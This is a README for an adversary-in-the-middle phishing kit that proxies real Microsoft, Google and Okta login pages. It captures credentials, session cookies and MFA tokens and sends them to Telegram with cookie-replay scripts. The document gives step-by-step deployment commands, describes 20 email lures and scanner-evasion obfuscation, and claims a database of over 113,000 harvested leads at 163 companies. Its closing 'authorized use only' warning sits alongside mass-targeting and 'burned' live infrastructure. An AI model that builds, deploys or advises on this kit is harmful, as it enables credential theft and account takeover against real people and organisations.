# GLNT Phish Kit — AiTM Reverse Proxy Framework

> **STRASSER ⛫ LAB** | Classification: Internal | Version: 1.1 | June 2026

A production-grade, Evilginx-style Adversary-in-the-Middle (AiTM) reverse proxy for authorized phishing simulations. The victim sees the **real** Microsoft/Google/Okta login page proxied through your domain. Credentials, session cookies, and MFA tokens are captured and delivered to Telegram with replay-ready scripts. No fake landing page — undetectable by DOM comparison.

## Architecture

```
Victim clicks link → Cloudflare Worker (TLS) → EC2 proxy-server (Go) → Real Login
                                                   │
                    ┌──────────────────────────────┼──────────┐
                    │                              │          │
              Bootloader           Body/Location rewriting   Telegram
              (decrypts fragment,  login.microsoftonline.com  per-click alerts
               sets cookies)       → login.your-domain.com   📄 page_load
                                                            🔑 creds_captured
                                                            🔴 full_capture
                                                            + .txt with cookies
```

## Current State — What's Built

### Live Infrastructure (glnt.cc — now burned)
- EC2 proxy-server running for 7+ days continuously
- Cloudflare Worker deployed (TLS, origin IP hidden, bot blocking)
- Analytics dashboard with campaign funnel, live polling
- 3 phishlets: Microsoft 365, Google Workspace, Okta SSO

### Attack Pipeline
- `prompt=login` forces fresh authentication even with existing browser cookies
- `/r` redirect hop hides the phishing URL from basic email scanners
- CDN routing forwards `/ests/` and `/shared/` paths to Microsoft's actual CDN
- Per-click Telegram alerts with severity levels: page load, credential capture, full MFA
- Cookie replay script auto-generated and attached to Telegram .txt files
- Email-named capture files (user_at_domain_com-session.txt)

### Email Lures — 20 Templates
- **10 email body lures:** shared-document, invoice-payment, meeting-invite, security-alert, voicemail, hr-document, it-support, contract-signature, expense-report, package-delivery
- **10 attachment lures:** DocuSign, Adobe Sign, Dropbox, SharePoint, OneDrive, Teams, Excel, Google Docs, Zoom, Stripe
- All wired with `{LINK}` and `{RECIPIENT_NAME}`/`##victimemail##` placeholders
- Obfuscated versions with JS-decoded links and entity encoding
- SuperMailer-ready (HTML Source tab → paste → send)
- `scripts/build-campaign-email.sh` automates link insertion

### Lead Generation
- **113,000+ leads** across 163 companies, 30+ industries, 6 continents
- All MX-verified with per-company CSVs
- `data/master_leads.csv` — master database
- `data/leads/*.csv` — individual company files ready for SuperMailer import

### OpSec Hardening
- JS symbols obfuscated (no `AES_KEY_B64`, `decryptAESGCM`, `lure` strings)
- URL fragment delivery — payload never sent in HTTP, invisible to scanners
- AES-256-GCM with random prefix — no static `mv=`/`bXY9` signature
- Bot UA blocking (14 crawler patterns)
- Rate limiting (10 req/min per IP)
- Custom 404 handler (not Go default)
- No plaintext credentials in server logs

## Quick Start

```bash
# 1. Generate encryption key
cd payload-generator && go run keygen.go
# Copy the base64 key

# 2. Set key in bootloader
# Edit proxy-server/bootloader.html
# Set: const _k = '<your-key>';

# 3. Set phishlet hostname
# Edit proxy-server/phishlets/microsoft.json
# Change "hostname" to "login.your-domain.com"

# 4. Build and start proxy
cd ../proxy-server
go build -o proxy-srv .
TELEGRAM_BOT_TOKEN="..." TELEGRAM_CHAT_ID="..." ./proxy-srv

# 5. Start analytics (optional)
cd ../analytics-server
go build -o analytics-srv .
./analytics-srv --data ../data/captures.jsonl --port 9092 --token "strong-token"

# 6. Deploy CDN fronting
cd ../cdn-config
# Edit wrangler.toml with your domain
npx wrangler login && npx wrangler deploy

# 7. Generate a campaign link
cd ../payload-generator
go run . --key <key> --email victim@company.com \
  --redirect "https://login.microsoftonline.com/common/oauth2/authorize?client_id=CLIENT_ID&redirect_uri=https://login.your-domain.com&response_type=code&prompt=login" \
  --campaign my-campaign

# 8. Build campaign emails
cd ../scripts
./build-campaign-email.sh shared-document "https://your-domain.com/#<fragment>" "John" email.html
```

## Components

| Component | Directory | Purpose |
|-----------|-----------|---------|
| Proxy Server | `proxy-server/` | AiTM reverse proxy, Telegram alerts, bootloader, phishlets |
| Payload Generator | `payload-generator/` | AES-256-GCM encrypted lure URL generation |
| Analytics Server | `analytics-server/` | Campaign dashboard, JSONL event tracking, funnel analytics |
| CDN Config | `cdn-config/` | Cloudflare Worker reverse proxy, bot blocking at edge |
| Email Lures | `lures/`, `campaign-emails/` | 20 HTML email templates ready for SuperMailer |
| Lead Database | `data/` | 113K+ leads across 163 companies, MX-verified |
| Playbook | `docs/playbook/` | Full operations guide in MD, HTML, PDF |
| Scripts | `scripts/` | Campaign email builder, URL generation, obfuscation |

## Planned Next Steps

- [ ] **Domain rotation** — register batch of `.cc` domains, age 2-3 weeks before deployment
- [ ] **Multi-host phishlet** — proxy office.com alongside login.microsoftonline.com for full personal account support
- [ ] **Email verification API** — integrate ZeroBounce/Hunter.io for deliverable lead verification
- [ ] **Evilginx 3 phishlet export** — convert our JSON phishlets to Evilginx YAML format for compatibility
- [ ] **Automated campaign manager** — web UI for building campaign emails, tracking open rates, managing lures
- [ ] **Multi-domain deployment script** — one-command deploy to new domain with all configs updated

## Requirements

- Go 1.22+ (proxy-server, payload-generator, analytics-server)
- Node.js 18+ (cdn-config — Cloudflare Wrangler)
- Cloudflare account (for CDN fronting)
- Telegram bot (for capture notifications)
- SuperMailer or similar bulk email software (for campaign delivery)

## Warning

This is a security research and education tool. Use only for authorized
phishing simulations, penetration testing, and red team operations with
explicit written authorization.
